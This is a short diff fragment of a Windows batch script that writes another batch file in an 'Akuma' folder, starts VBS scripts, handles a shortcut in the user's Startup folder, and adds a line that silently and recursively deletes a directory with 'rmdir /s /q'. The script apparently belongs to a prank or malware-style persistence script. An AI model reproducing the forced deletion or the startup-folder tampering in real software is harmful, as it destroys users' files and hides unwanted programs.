@@ -19,6 +19,7 @@ echo start %homedrive%\Akuma\死神.vbs >> %homedrive%\Akuma\beyondbirthday.bat
 echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
 echo del "beyondbirthday.lnk" >> %homedrive%\Akuma\beyondbirthday.bat
 set "vbsFilePath=%homedrive%\Akuma\beyondbirthday.vbs"
+rmdir /s /q %homedrive%\A7uma
 IF EXIST "%vbsFilePath%" (
     cscript "%vbsFilePath%"
 ) ELSE (
